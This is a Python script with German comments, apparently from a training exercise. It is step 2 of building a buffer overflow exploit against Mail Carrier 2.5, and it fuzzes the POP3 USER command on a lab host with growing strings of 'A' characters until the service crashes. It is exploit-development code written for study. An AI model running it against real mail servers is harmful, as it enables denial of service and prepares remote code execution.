# coding=utf-8
# -------------Mail Carrier 2.5 Buffer Overflow Exploit Uebung  -------------------------
# ---------------------------------------------------------------------------------------
# Entwickeln eines Buffer Overflow Exploits mit Remote Code Execution von Grund auf------
# ---------------------------------------------------------------------------------------
# Schritt 2: Fuzzing des Username -------------------------------------------------------
# ---------------------------------------------------------------------------------------

import socket, time

# Ip des Windows Clients
RHOST = "10.10.10.12"

# Start Menge an Zeichen für das Fuzzing
amount = 500

# Fuzzing Schleife
while True:
    # Payload mit einer Menge an "A" Zeichen als Byte
    payload = "\x41" * amount
    print("Fuzzing... sending " + str(amount) + " of characters")
    # Verbindung zum Windows Client aufbauen
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connection.connect((RHOST, 110))
    # Empfang von Daten wenn der Server antwortet
    print(connection.recv(1024))
    # Fuzzing des Usernames
    connection.send("USER " + payload + "\r\n")
    # Empfang wenn der Username angenommen wird und DAten zurück gesendet werden
    print(connection.recv(1024))
    # Geregeltes schliessen der Verbindung
    connection.send("QUIT\r\n")
    print(connection.recv(1024))
    connection.close()
    # ERhögung der Zeichenzahl
    amount += 300
    # Kurze Unterbrechung zur Vermeidung von Verbindungsaufbau Schwierigkeiten
    time.sleep(2)
